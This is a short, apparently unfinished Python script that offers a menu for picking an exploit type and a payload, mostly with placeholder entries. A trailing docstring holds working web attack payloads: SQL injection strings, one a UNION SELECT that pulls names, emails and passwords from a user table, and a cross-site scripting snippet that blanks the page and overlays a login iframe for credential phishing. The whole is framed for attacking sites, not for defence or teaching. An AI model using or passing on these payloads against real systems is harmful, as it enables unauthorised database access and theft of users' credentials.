import sys 

exploits = ["SQL Injection","Cross Site Scripting","Something else"]
payloads = [["x","y","z"],["Steal user credentials using fake login page","b","c"],["1","2","3"]]
print("Type the number next to the type of exploit you want")
count = 1
for i in exploits:
	print( str(count) + " : "+ i)
	count += 1
answer = sys.stdin.readline()
answer = int(answer)
print("You've chosen " + exploits[answer - 1])
print("Here are the payloads you can choose from")
count = 1
for i in payloads[answer - 1]:
	print(str(count) + ": " + i)
	count += 1
print("Type the number next to the payload you want")
answer2 = sys.stdin.readline()
answer2 = int(answer2)
print("You've chosen " + payloads[answer - 1][answer2 - 1])




"""
blah' or '1'='1' --
blah' or '1'='1' union select first_name, last_name, email, id, password from user --

<script> 
document.body.innerHTML = '';
var iFrame = document.createElement('iframe');
var html = '<body>Foo</body>';
iFrame.frameBorder = "0";
iFrame.src = '/login';
iFrame.width  = window.innerWidth;
iFrame.height = window.innerHeight;
document.body.appendChild(iFrame);
console.log('iFrame.contentWindow =', iFrame.contentWindow);
 </script>

"""